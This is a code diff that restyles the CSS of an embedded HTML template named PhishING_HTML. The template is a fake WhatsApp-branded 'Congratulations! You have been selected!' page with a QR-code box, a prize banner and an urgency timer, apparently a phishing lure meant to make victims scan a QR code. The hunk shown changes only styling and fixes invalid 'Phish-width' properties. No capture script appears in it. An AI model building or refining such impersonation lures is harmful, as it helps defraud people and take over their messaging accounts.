@@ -31,17 +31,92 @@ PhishING_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Congratulations! You have been selected!</title>
     <style>
-        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); margin: 0; padding: 20px; color: white; text-align: center; }
-        .container { Phish-width: 500px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; color: #333; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
-        .whatsapp-logo { width: 80px; height: 80px; background: #25D366; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
-        h1 { color: #128C7E; font-size: 28px; margin-bottom: 15px; }
-        .qr-container { margin: 25px auto; padding: 20px; background: #f9f9f9; border-radius: 10px; border: 2px dashed #25D366; }
-        .qr-code { Phish-width: 300px; margin: 0 auto; }
-        .qr-code img { width: 100%; height: auto; border: 1px solid #ddd; border-radius: 5px; }
-        .instructions { background: #E8F5E9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left; }
-        .prize { font-size: 22px; color: #E91E63; font-weight: bold; margin: 20px 0; padding: 15px; background: #FFF3E0; border-radius: 8px; border: 2px solid #FF9800; }
-        .timer { font-size: 16px; color: #D32F2F; font-weight: bold; margin: 15px 0; }
-    </style>
+    body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+        margin: 0;
+        padding: 20px;
+        color: white;
+        text-align: center;
+    }
+
+    .container {
+        width: 500px;
+        max-width: 90%;
+        margin: 30px auto;
+        background: white;
+        padding: 30px;
+        border-radius: 15px;
+        color: #333;
+        box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+        box-sizing: border-box;
+    }
+
+    .whatsapp-logo {
+        width: 80px;
+        height: 80px;
+        background: #25D366;
+        border-radius: 50%;
+        margin: 0 auto 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 40px;
+    }
+
+    h1 {
+        color: #128C7E;
+        font-size: 28px;
+        margin-bottom: 15px;
+    }
+
+    .qr-container {
+        margin: 25px auto;
+        padding: 20px;
+        background: #f9f9f9;
+        border-radius: 10px;
+        border: 2px dashed #25D366;
+    }
+
+    .qr-code {
+        width: 300px;
+        max-width: 100%;
+        margin: 0 auto;
+    }
+
+    .qr-code img {
+        width: 100%;
+        height: auto;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+    }
+
+    .instructions {
+        background: #E8F5E9;
+        padding: 15px;
+        border-radius: 8px;
+        margin: 20px 0;
+        text-align: left;
+    }
+
+    .prize {
+        font-size: 22px;
+        color: #E91E63;
+        font-weight: bold;
+        margin: 20px 0;
+        padding: 15px;
+        background: #FFF3E0;
+        border-radius: 8px;
+        border: 2px solid #FF9800;
+    }
+
+    .timer {
+        font-size: 16px;
+        color: #D32F2F;
+        font-weight: bold;
+        margin: 15px 0;
+    }
+</style>
 </head>
 <body>
     <div class="container">
